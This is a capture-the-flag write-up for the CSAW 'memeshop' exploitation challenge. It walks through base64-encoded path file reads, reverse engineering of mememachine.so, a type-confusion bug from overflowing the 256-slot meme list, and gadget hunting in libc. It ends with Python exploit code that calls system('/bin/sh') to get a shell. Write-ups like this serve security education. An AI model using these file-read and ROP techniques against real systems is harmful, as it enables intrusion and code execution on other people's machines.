# Exploit 400 - memeshop

There's no binary for this challenge, so I was excited that it would be my favorite challenge type - guessing. Unfortunately, it turned out to just be another pwning. With a twist (or five). I don't have all the meme files, so I'll just be winging that part. Imagine in your head that each meme selection prints out high-quality ASCII art of your chosen meme. I've put supporting files in this folder.

When you connect, you're presented with a random "fortune" and a selection of memes to choose from (pared down here as an example). 

```
so... lets see what is on the menu
[p]rint receipt from confirmation number
[n]ic cage (RARE MEME)
n[y]an cat
[l]ike a sir
[m]r skeletal (doot doot)
[t]humbs up
[c]heck out
[q]uit
```

Selecting a meme (not [p], [c], or [q]) prints out an ASCII art meme. But, if you choose `[m]r skeletal`, you're asked for input (namely, a response to `so... what do you say to mr skeletal?`). Put some random crap there, and it tells you `im going to steal all ur calcuims`. Rude.

After adding some memes to your cart (i.e. selecting them), check out and notice that it gives you an "order string" that looks a lot like base64. 

```
[c]heck out
[q]uit
c
ur receipt is at L3RtcC9tZW1lMjAxNTA5MjAtOTQwNS0zYXA4b2Y=
you are going to get memed on so hard with no calcium
bye
```

Of course we want to see what that is:

```
<bspar@bspararch:~/Documents/ctfs/csaw>
zsh/3 13864 [1] % echo L3RtcC9tZW1lMjAxNTA5MjAtOTQwNS0zYXA4b2Y= | base64 --decode
/tmp/meme20150920-9405-3ap8of
```

Nice. Let's `[p]rint receipt from confirmation number`. 

```
p
ok, let me know your order number bro: L3RtcC9tZW1lMjAxNTA5MjAtOTQwNS0zYXA4b2Y=
ok heres ur receipt or w/e
u got memed on 1 times, memerino
```

Is it just reading a file?

```
<bspar@bspararch:~/Documents/ctfs/csaw>
zsh/3 13867 [130] % echo flag | base64
ZmxhZwo=
[...]
ok, let me know your order number bro: ZmxhZwo=
flag{just kidding, you need a shell}
```

Nice. Submit that for 400 points.

Not really. But that does let you read *some* files. You may be familiar with the /proc filesystem in Linux. If not, read up: http://linux.die.net/man/5/proc.

First we want the binary... That seems like a good idea. Reading `/proc/self/cmdline` should give us some stuff.

```
<bspar@bspararch:~/Documents/ctfs/csaw>
zsh/3 13947 [130] % echo -n "/proc/self/cmdline" | base64
L3Byb2Mvc2VsZi9jbWRsaW5l
[...]
ok, let me know your order number bro: L3Byb2Mvc2VsZi9jbWRsaW5l
ok heres ur receipt or w/e
ruby./memeshop.rb
```

Nice. Let's grab `memeshop.rb`.

```
<bspar@bspararch:~/Documents/ctfs/csaw>
zsh/3 13949 [130] % echo -n "memeshop.rb" | base64
bWVtZXNob3AucmI=
[...]
ok, let me know your order number bro: bWVtZXNob3AucmI=
ok heres ur receipt or w/e
#!/usr/bin/env ruby
GC.disable
require 'tempfile'
require 'base64'
require_relative './plugin/mememachine.so'
[...]
```
This is about when I started scripting stuff. I made a convenient `dump_file()` function to download and dump and save whatever file it was passed (Note: yeah it's buggy - I don't really care). `memeshop.rb` and `pwn_memeshop.py` are here, as well as other supporting files.

Well you can see that it also requires `./plugin/mememachine.so`. Get that. You also need a fortunes and memes dir with stuff inside. Populate that. I just did `echo hi > memes/{skeletal,whatever}`. Then you can run it! 

Running it isn't the easiest if you don't have ruby set up (or if it's set up strange). Make sure you have proper paths set up. I found ruby 2.1.2 worked nicely on my box.

`memeshop.rb` is fairly simple - I don't see any vulns there. So you'll probably be exploiting `mememachine.so`. Drop that into your favorite disassembler/decompiler/debugger. Oh look, there are symbols. Nice.

Let's check out method_addskeletal. That `malloc`s an object then copies your text to it, setting a function pointer along the way (to `gooder` or `badder` depending on whether or not you said "thanks mr skeletal"). It then increases the global counter pointer, adds a pointer to the global meme list (, and adds a new entry to the `types` list accordingly. 

```
.text:0000000000000C02 c_mystring = rbx                        ; char * ; size
.text:0000000000000C02                 mov     edi, 118h
.text:0000000000000C07                 call    _malloc
.text:0000000000000C0C mynewmeme = rax                         ; SKELETAL *
.text:0000000000000C0C                 mov     rdx, [c_mystring]    ; our input string
.text:0000000000000C0F                 lea     rsi, aThanksMrSkelet ; "thanks mr skeletal"
.text:0000000000000C16                 mov     ecx, 13h
.text:0000000000000C1B                 mov     rdi, mynewmeme       ; malloc'd
.text:0000000000000C1E                 mov     [mynewmeme], rdx
.text:0000000000000C21                 mov     rdx, [c_mystring+8]
.text:0000000000000C25                 mov     [mynewmeme+8], rdx
.text:0000000000000C29                 mov     rdx, [c_mystring+10h]
.text:0000000000000C2D                 mov     [mynewmeme+10h], rdx
[...]
.text:0000000000000D20                 mov     rcx, cs:counter_ptr  ; global meme count
.text:0000000000000D27                 mov     rsi, cs:memerz_ptr   ; global meme list
.text:0000000000000D2E                 movzx   edi, byte ptr [rcx]
.text:0000000000000D31                 mov     [rsi+rdi*8], mynewmeme   ; put meme into the list
.text:0000000000000D35                 mov     rsi, cs:types_tracker_ptr  ; types list index
.text:0000000000000D3C                 mov     rdx, rdi
.text:0000000000000D3F                 mov     rdi, cs:types_ptr    ; types list
.text:0000000000000D46                 add     edx, 1
.text:0000000000000D49                 mov     [rcx], dl
.text:0000000000000D4B                 movsxd  r8, dword ptr [rsi]
.text:0000000000000D4E                 mov     mynewmeme, r8
.text:0000000000000D51                 mov     qword ptr [rdi+r8*8], 1  ; a mrskeletal is type "1"
```

Well that's fun. Notice how there's no limit to the amount of mrskeletals you can add. Let's keep that in mind and check out the regular memes (`method_addmeme`). It just `malloc`s an object and then updates those same globals as `mr skeletal`. But note that the size is different (since there's no text) and the type is `0`.

```
.text:0000000000000B79                 call    _malloc
.text:0000000000000B7E mynewmeme = rax                         ; MEME *
.text:0000000000000B7E                 mov     rcx, cs:counter_ptr  ; global counter
.text:0000000000000B85                 mov     rsi, cs:memerz_ptr   ; meme list
.text:0000000000000B8C                 mov     rdx, cs:gooder_ptr   ; function pointer to "gooder"
.text:0000000000000B93                 mov     dword ptr [mynewmeme+10h], 0   ; meme type "0"
.text:0000000000000B9A                 movzx   edi, byte ptr [rcx]
.text:0000000000000B9D                 mov     [mynewmeme+8], rdx   ; store "gooder" pointer
.text:0000000000000BA1                 mov     [rsi+rdi*8], mynewmeme   ; store meme
.text:0000000000000BA5                 mov     rsi, cs:types_tracker_ptr  ; type list index
.text:0000000000000BAC                 mov     rdx, rdi
.text:0000000000000BAF                 mov     rdi, cs:types_ptr    ; types list
.text:0000000000000BB6                 add     edx, 1
.text:0000000000000BB9                 mov     [rcx], dl
.text:0000000000000BBB                 movsxd  r8, dword ptr [rsi]
.text:0000000000000BBE                 mov     mynewmeme, r8
.text:0000000000000BC1                 mov     qword ptr [rdi+r8*8], 0  ; store type
```

Check out the globals:

```
.bss:0000000000202084 ; int types_tracker
.bss:0000000000202084 types_tracker   dd ?                    ; DATA XREF: .got:types_tracker_ptro
.bss:0000000000202088 ; uint8_t counter
.bss:0000000000202088 counter         db ?                    ; DATA XREF: .got:counter_ptro
.bss:00000000002020C0 ; size_t memerz[256]
.bss:00000000002020C0 memerz          dq 100h dup(?)          ; DATA XREF: .got:memerz_ptro
.bss:00000000002028C0 ; size_t types[256]
.bss:00000000002028C0 types           dq 100h dup(?)          ; DATA XREF: .got:types_ptro
```

Looks like each array is 256 `size_t`s long. Let's check out the `checkout` method for good measure...

It gets those global lists and iterates through it, counting the number of memes. Also, it calls each function pointer and checks to make sure it's `gooder`. If it's `badder`, it'll make sure to print out `you are going to get memed on so hard with no calcium`. It calls different offsets depending on the type (because the function pointer is at different locations.

Type 0 (regular meme):
```
.text:0000000000000DA8                 add     rbx, 8
.text:0000000000000DAC                 mov     edi, [memerino+10h]
.text:0000000000000DAF                 call    qword ptr [memerino+8]
```
Type 1 (mr skeletal):
```
.text:0000000000000DC5                 add     rbx, 8
.text:0000000000000DC9                 mov     edi, [memerino+110h]
.text:0000000000000DCF                 call    qword ptr [memerino+108h]
```

Well this is just asking for type confusion... Let's give it too many memes and see what happens. Specifically, let's fill up the list with one type and then add another of the other type. I scripted that doing something like the following.

```python
for _ in range(256):
  add_meme()
add_skel()
```

My `add_skel()` function responds with `thanks mr skeletal` if no other response is specified. Then checkout to trigger the call to the function pointer.

Yay, a segfault. `method_checkout+0x3f` is `.text:0000000000000DAF                 call    qword ptr [memerino+8]`. Nice.

```
'/home/bspar/Documents/ctfs/csaw/plugin/mememachine.so(method_checkout+0x3f) [0x7f124bab9daf] mememachine.c:99\n'
```

Let's check out what it's calling... Start the program and attach your debugger to it.

```
<bspar@bspararch:~/Documents/ctfs/csaw>
zsh/2 13944 % gdb -p `pgrep ruby`
[...]
gdb-peda$ b  *method_checkout+63
Breakpoint 1 at 0x7fcc80e9bdaf: file mememachine.c, line 99.
```

Continue in the debugger and check out in the memeshop. You hit the breakpoint and see:

```
RAX: 0x11a38f0 ("thanks mr skeletal")
[...]
=> 0x7fcc80e9bdaf <method_checkout+63>:	call   QWORD PTR [rax+0x8]
```

Just to reiterate:

```
gdb-peda$ x/gx $rax+0x8
0x11a38f8:	0x74656c656b732072
gdb-peda$ x/s $rax+0x8
0x11a38f8:	"r skeletal"
```

Yay $RIP control. Note the instruction just preceding it:

```
0x7fcc80e9bdac <method_checkout+60>:	mov    edi,DWORD PTR [rax+0x10]
```

That means you also have control of the first argument! So put a pointer to `/bin/sh` in there and call `system`. 

```
gdb-peda$ searchmem "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 5 results, display max 5 items:
          [heap] : 0x9706e0 --> 0x68732f6e69622f ('/bin/sh')
          [heap] : 0x9746a0 --> 0x68732f6e69622f ('/bin/sh')
libruby.so.2.2.0 : 0x7fcc80b91d04 --> 0x68732f6e69622f ('/bin/sh')
            libc : 0x7fcc81b103b8 --> 0x68732f6e69622f ('/bin/sh')
libruby.so.2.1.0 : 0x7fcc82b4e151 --> 0x68732f6e69622f ('/bin/sh')
```

Well there's `/bin/sh` on the heap and in shared libraries... We can get library bases from `/proc/self/maps`, but heap stuff can be a bit more annoying. So let's get that libc offset...

```
gdb-peda$ vmmap
Start              End                Perm	Name
0x00400000         0x00401000         r-xp	/home/bspar/.rvm/rubies/ruby-2.1.2/bin/ruby
[...]
0x00007fcc819ab000 0x00007fcc81b46000 r-xp	/usr/lib/libc-2.22.so
[...]
```

So the string `/bin/sh` is located at an offset of `0x7fcc81b103b8 - 0x00007fcc819ab000 = 0x1653B8` from the base of libc. So let's find the offset of system:

```
<bspar@bspararch:~/Documents/ctfs/csaw>
zsh/3 13960 % objdump -T /usr/lib/libc-2.22.so| grep system
[...]
000000000003f890  w   DF .text	000000000000002d  GLIBC_2.2.5 system
```

That's at offset `0x3f890`. Nice. So what we need to do now is leak the libc base then add `0x1653B8` to get a pointer to `/bin/sh` and add `0x3f890` to get a pointer to `system()`. Go look back at how the mrskeletal struct is set up. It has a bunch of text followed by function pointers. But the regular meme struct calls the second word of the struct while passing the third word as the argument. So the exploit string will be something like `'A'*8 + p64(libc+0x3f890) + p64(libc+0x1653B8)`. That gets base64 encoded and put in as the response to mr skeletal.

Now run it and see what happens. Notice how it's loading the "argument" struct member into $EDI instead of $RDI. That's chopping off our top bits. FRICK. Now just fire up 1000000 cores, spray the stack with `/bin/sh`s, and brute force. Or actually finish the exploit like a real hacker.

We'll need some sort of ROP going on. We don't control the stack, so we can't get much of a ROP chain going on. But we do control what RAX points to, so that's nice. I'd say this is the hardest/longest part of the challenge. You need to find something to put a pointer into `$RDI`. It would be nice to have a `mov rdi, rax` since we can just put `/bin/sh\x00` into the first 8 bytes there.

```
ROPgadget --binary tmp/usr/lib/libc-2.22.so > libc-remote.rop
```

How are we going to continue execution after moving something into `$RDI`? We'll need a `call qword ptr [rax]` instead of a ret at the end. There aren't too many of those, so let's find something that moves stuff into `$RDI`. Try it..... Not much good, is there?

Try harder. Notice that `$RBP` is nice and small. Also check out `method_checkout()`. Notice this: `.text:0000000000000DD5                 or      ebp, eax`. That means we can control `$RBP` if we do a simple `ret;` after the call that we control. Then we'll just do another skeletal to exploit it again. Then we can look for gadgets again, this time controlling `$RBP` also. The top gadget is from my local libc, the second is from the remote libc.

```
0x000000000010a474 : mov rdi, rbp ; lea r9, qword ptr [rsp + 0x18] ; call qword ptr [rax]
0x0000000000120173 : mov rdi, rbp ; call qword ptr [rax]
```

Nice. So move `$RBP` into `$RDI` and call the pointer at the beginning of our string buffer. Also note that `$RBP` will be set to the beginning of the previous skeletal, so it's just garbage as of now. So, we can make that point to `/bin/sh`! Then make the beginning of this point to `system()`. Some relevant code from my exploit (with actual remote values):

```python
system = libc + 0x46640
binsh = libc + 0x17CCDB
bespoke_ret = libc + 0xf479e
bespoke_gadget = libc + 0x120173
log.info('System: {} \tbinsh: {}'.format(hex(system), hex(binsh)))
for _ in range(250):
  add_meme()
for _ in range(6):
  add_skel()
sploit = '/bin/sh\x00'  # this will go into rbp, then rdi
sploit += p64(bespoke_ret)  # this is the first ret
add_skel(resp=sploit)
sploit = p64(system)    # bespoke_gadget calls this
sploit += p64(bespoke_gadget)
add_skel(resp=sploit)
r.interactive()
```

And...

```
$ c
ur receipt is at L3RtcC9tZW1lMjAxNTA5MjAtMjkzMjItMXRldDNrMw==
$ cat ../flag
flag{dwn: please tell us your meme. I'm not going to stop asking}
$  
```

Nice.
